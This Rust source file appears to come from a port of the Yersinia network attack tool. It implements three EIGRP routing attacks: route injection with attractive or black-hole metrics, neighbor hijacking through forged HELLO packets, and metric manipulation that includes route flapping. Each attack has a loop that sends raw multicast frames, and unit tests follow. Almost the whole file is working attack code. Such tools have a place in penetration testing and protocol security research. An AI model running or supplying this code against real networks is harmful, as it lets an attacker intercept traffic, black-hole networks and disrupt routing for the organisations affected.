//! EIGRP Attack Implementations

use super::packet::{EigrpOpcode, EigrpPacket, EigrpTlv, RouteMetrics};
use async_trait::async_trait;
use std::net::Ipv4Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

/// EIGRP Route Injection Attack
///
/// Injects malicious routes into the EIGRP routing domain to redirect
/// traffic through the attacker or cause routing loops and black holes.
#[derive(Debug, Clone)]
pub struct EigrpRouteInjectionAttack {
    /// Autonomous System number
    pub as_number: u16,
    /// Routes to inject (network, prefix_len)
    pub routes: Vec<(Ipv4Addr, u8)>,
    /// Next hop for injected routes (attacker IP)
    pub next_hop: Option<Ipv4Addr>,
    /// Delay metric (in 10s of microseconds)
    pub delay: u32,
    /// Bandwidth metric (in units of 256 Kbps)
    pub bandwidth: u32,
    /// Make routes more attractive (lower metric)
    pub best_route: bool,
    /// Sequence number for updates
    pub sequence: u32,
}

impl EigrpRouteInjectionAttack {
    pub fn new(as_number: u16) -> Self {
        Self {
            as_number,
            routes: vec![],
            next_hop: None,
            delay: 100,
            bandwidth: 10000000,
            best_route: true,
            sequence: 1,
        }
    }

    pub fn add_route(mut self, network: Ipv4Addr, prefix_len: u8) -> Self {
        self.routes.push((network, prefix_len));
        self
    }

    pub fn with_next_hop(mut self, next_hop: Ipv4Addr) -> Self {
        self.next_hop = Some(next_hop);
        self
    }

    /// Black hole mode: advertise routes with unreachable metric
    pub fn black_hole_mode(mut self) -> Self {
        self.delay = 0xFFFFFF00; // Maximum delay
        self.bandwidth = 1; // Minimum bandwidth
        self.best_route = false;
        self
    }

    /// Build UPDATE packet with injected routes
    pub fn build_update(&mut self) -> EigrpPacket {
        let mut packet = EigrpPacket::update(self.as_number, self.sequence).set_init_flag();

        // Adjust metrics based on mode
        let (delay, bandwidth) = if self.best_route {
            (10, 10000000) // Very fast link
        } else {
            (self.delay, self.bandwidth)
        };

        for (network, prefix_len) in &self.routes {
            let metrics = RouteMetrics::new(delay, bandwidth, 1500, 1, 255, 1);
            let tlv = EigrpTlv::internal_route(*network, *prefix_len, metrics);
            packet = packet.add_tlv(tlv);
        }

        self.sequence += 1;
        packet
    }

    /// Build multiple UPDATEs if routes exceed packet size
    pub fn build_updates(&mut self) -> Vec<EigrpPacket> {
        let mut packets = vec![];
        let routes_per_packet = 20; // Conservative estimate

        for chunk in self.routes.chunks(routes_per_packet) {
            let mut packet = EigrpPacket::update(self.as_number, self.sequence).set_init_flag();

            let (delay, bandwidth) = if self.best_route {
                (10, 10000000)
            } else {
                (self.delay, self.bandwidth)
            };

            for (network, prefix_len) in chunk {
                let metrics = RouteMetrics::new(delay, bandwidth, 1500, 1, 255, 1);
                let tlv = EigrpTlv::internal_route(*network, *prefix_len, metrics);
                packet = packet.add_tlv(tlv);
            }

            self.sequence += 1;
            packets.push(packet);
        }

        packets
    }
}

/// EIGRP Neighbor Hijacking Attack
///
/// Establishes a fake EIGRP neighbor relationship with routers to
/// inject routes, manipulate routing tables, or intercept routing updates.
#[derive(Debug, Clone)]
pub struct EigrpNeighborHijackAttack {
    /// Autonomous System number
    pub as_number: u16,
    /// Attacker's IP address
    pub attacker_ip: Ipv4Addr,
    /// Hello interval (seconds)
    pub hello_interval: u16,
    /// Hold time (seconds)
    pub hold_time: u16,
    /// K-values for metric calculation
    pub k_values: (u8, u8, u8, u8, u8),
    /// Sequence number
    pub sequence: u32,
}

impl EigrpNeighborHijackAttack {
    pub fn new(as_number: u16, attacker_ip: Ipv4Addr) -> Self {
        Self {
            as_number,
            attacker_ip,
            hello_interval: 5,
            hold_time: 15,
            k_values: (1, 0, 1, 0, 0), // Default K-values
            sequence: 1,
        }
    }

    pub fn with_k_values(mut self, k1: u8, k2: u8, k3: u8, k4: u8, k5: u8) -> Self {
        self.k_values = (k1, k2, k3, k4, k5);
        self
    }

    /// Build HELLO packet
    pub fn build_hello(&self) -> EigrpPacket {
        let (k1, k2, k3, k4, k5) = self.k_values;
        EigrpPacket::hello(self.as_number, self.hold_time).add_tlv(EigrpTlv::general_parameters(
            k1,
            k2,
            k3,
            k4,
            k5,
            self.hold_time,
        ))
    }

    /// Build initial UPDATE (with Init flag)
    pub fn build_initial_update(&mut self) -> EigrpPacket {
        let packet = EigrpPacket::update(self.as_number, self.sequence).set_init_flag();
        self.sequence += 1;
        packet
    }

    /// Build ACK packet
    pub fn build_ack(&self, ack_number: u32) -> EigrpPacket {
        EigrpPacket::new(EigrpOpcode::Hello, self.as_number).with_ack(ack_number)
    }
}

/// EIGRP Metric Manipulation Attack
///
/// Manipulates EIGRP route metrics to influence path selection,
/// causing suboptimal routing, traffic engineering, or creating
/// routing loops.
#[derive(Debug, Clone)]
pub struct EigrpMetricManipulationAttack {
    /// Autonomous System number
    pub as_number: u16,
    /// Target networks to manipulate
    pub target_networks: Vec<(Ipv4Addr, u8)>,
    /// Manipulation mode
    pub mode: MetricManipulationMode,
    /// Sequence number
    pub sequence: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MetricManipulationMode {
    /// Advertise with best possible metric
    BestMetric,
    /// Advertise with worst possible metric (DoS)
    WorstMetric,
    /// Advertise with slightly better metric (subtle hijack)
    SlightlyBetter,
    /// Constantly change metrics (route flapping)
    Flapping,
}

impl EigrpMetricManipulationAttack {
    pub fn new(as_number: u16) -> Self {
        Self {
            as_number,
            target_networks: vec![],
            mode: MetricManipulationMode::BestMetric,
            sequence: 1,
        }
    }

    pub fn add_target(mut self, network: Ipv4Addr, prefix_len: u8) -> Self {
        self.target_networks.push((network, prefix_len));
        self
    }

    pub fn set_mode(mut self, mode: MetricManipulationMode) -> Self {
        self.mode = mode;
        self
    }

    /// Get metrics based on mode
    fn get_metrics(&self) -> (u32, u32) {
        match self.mode {
            MetricManipulationMode::BestMetric => (1, 100000000), // Min delay, max bandwidth
            MetricManipulationMode::WorstMetric => (0xFFFFFF00, 1), // Max delay, min bandwidth
            MetricManipulationMode::SlightlyBetter => (50, 50000000), // Slightly better
            MetricManipulationMode::Flapping => {
                // Alternate between good and bad
                if self.sequence % 2 == 0 {
                    (10, 10000000)
                } else {
                    (1000, 1000000)
                }
            }
        }
    }

    /// Build UPDATE with manipulated metrics
    pub fn build_update(&mut self) -> EigrpPacket {
        let mut packet = EigrpPacket::update(self.as_number, self.sequence);
        let (delay, bandwidth) = self.get_metrics();

        for (network, prefix_len) in &self.target_networks {
            let metrics = RouteMetrics::new(delay, bandwidth, 1500, 1, 255, 1);
            let tlv = EigrpTlv::internal_route(*network, *prefix_len, metrics);
            packet = packet.add_tlv(tlv);
        }

        self.sequence += 1;
        packet
    }

    /// Build QUERY packet (forces route recalculation)
    pub fn build_query(&mut self) -> EigrpPacket {
        let mut packet = EigrpPacket::query(self.as_number, self.sequence);
        let (delay, bandwidth) = (0xFFFFFFFF, 0); // Unreachable

        for (network, prefix_len) in &self.target_networks {
            let metrics = RouteMetrics::new(delay, bandwidth, 1500, 1, 255, 1);
            let tlv = EigrpTlv::internal_route(*network, *prefix_len, metrics);
            packet = packet.add_tlv(tlv);
        }

        self.sequence += 1;
        packet
    }
}

#[async_trait]
impl Attack for EigrpRouteInjectionAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(200);
        let mut attack_clone = self.clone();

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let eigrp_packet = attack_clone.build_update();
            let eigrp_bytes = eigrp_packet.to_bytes();

            let dst_mac = MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x0A]); // EIGRP multicast
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, eigrp_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending EIGRP route injection packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "EIGRP Route Injection"
    }
}

#[async_trait]
impl Attack for EigrpNeighborHijackAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let hello_interval = Duration::from_secs(self.hello_interval as u64);
        let attack_clone = self.clone();

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let hello_packet = attack_clone.build_hello();
            let hello_bytes = hello_packet.to_bytes();

            let dst_mac = MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x0A]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, hello_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending EIGRP neighbor hijack packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(hello_interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "EIGRP Neighbor Hijacking"
    }
}

#[async_trait]
impl Attack for EigrpMetricManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(500);
        let mut attack_clone = self.clone();

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let eigrp_packet = attack_clone.build_update();
            let eigrp_bytes = eigrp_packet.to_bytes();

            let dst_mac = MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x0A]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, eigrp_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending EIGRP metric manipulation packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "EIGRP Metric Manipulation"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_route_injection() {
        let mut attack = EigrpRouteInjectionAttack::new(100)
            .add_route("10.0.0.0".parse().unwrap(), 8)
            .add_route("192.168.0.0".parse().unwrap(), 16);

        let packet = attack.build_update();
        assert_eq!(packet.opcode, EigrpOpcode::Update);
        assert_eq!(packet.autonomous_system, 100);
    }

    #[test]
    fn test_neighbor_hijack() {
        let attack = EigrpNeighborHijackAttack::new(100, "10.0.0.1".parse().unwrap());
        let hello = attack.build_hello();

        assert_eq!(hello.opcode, EigrpOpcode::Hello);
        assert!(!hello.tlvs.is_empty());
    }

    #[test]
    fn test_metric_manipulation() {
        let mut attack = EigrpMetricManipulationAttack::new(100)
            .add_target("172.16.0.0".parse().unwrap(), 16)
            .set_mode(MetricManipulationMode::BestMetric);

        let packet = attack.build_update();
        assert_eq!(packet.opcode, EigrpOpcode::Update);
    }
}
